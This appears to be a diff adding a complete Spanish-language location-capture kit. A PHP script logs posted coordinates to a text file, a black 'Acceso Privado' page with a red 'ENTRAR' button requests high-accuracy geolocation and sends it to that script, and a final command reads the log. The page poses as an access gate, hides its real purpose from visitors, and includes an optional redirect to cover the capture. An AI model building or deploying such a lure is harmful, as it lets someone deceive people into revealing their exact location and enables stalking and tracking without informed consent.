@@ -1,0 +1,108 @@
+nano guardar_ubicacion.php
+
+
+<?php
+$rawdata = file_get_contents('php://input');
+$data = json_decode($rawdata, true);
+
+if (isset($data['lat']) && isset($data['lon'])) {
+    $lat = $data['lat'];
+    $lon = $data['lon'];
+    $acc = $data['acc'];
+    $fecha = date("Y-m-d H:i:s");
+
+    // Formato para guardar en un bloc de notas
+    $resultado = "Fecha: $fecha | Latitud: $lat | Longitud: $lon | Precisión: $acc metros\n";
+    file_put_contents("ubicaciones.txt", $resultado, FILE_APPEND);
+
+    echo "Ubicación guardada con éxito";
+} else {
+    echo "No se recibieron datos.";
+}
+?>
+
+
+nano index.html
+
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Acceso Privado</title>
+    <style>
+        body {
+            background-color: #000000;
+            color: #ffffff;
+            font-family: sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        h2 {
+            margin-bottom: 30px;
+            font-size: 24px;
+        }
+        .btn-entrar {
+            background-color: #ff0000;
+            color: #ffffff;
+            border: none;
+            padding: 20px 40px;
+            font-size: 22px;
+            font-weight: bold;
+            border-radius: 12px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.4);
+        }
+        .btn-entrar:active {
+            transform: scale(0.95);
+        }
+    </style>
+</head>
+<body>
+
+    <h2>Bienvenido</h2>
+    <button class="btn-entrar" onclick="obtenerUbicacion()">ENTRAR</button>
+
+    <script>
+        function obtenerUbicacion() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(posicion) {
+                    var latitud = posicion.coords.latitude;
+                    var longitud = posicion.coords.longitude;
+                    var precision = posicion.coords.accuracy;
+
+                    // Enviar coordenadas al archivo PHP por POST
+                    fetch('guardar_ubicacion.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ lat: latitud, lon: longitud, acc: precision })
+                    })
+                    .then(response => response.text())
+                    .then(data => {
+                        console.log(data);
+                        alert("¡Acceso concedido!");
+                        // Opcional: Redirigir a otra página después de obtener los datos
+                        // window.location.href = "https://google.com";
+                    });
+
+                }, function(error) {
+                    alert("Se requiere aceptar el permiso de ubicación para continuar.");
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                alert("Tu navegador no soporta geolocalización.");
+            }
+        }
+    </script>
+</body>
+</html>
+
+
+cat ubicaciones.txt
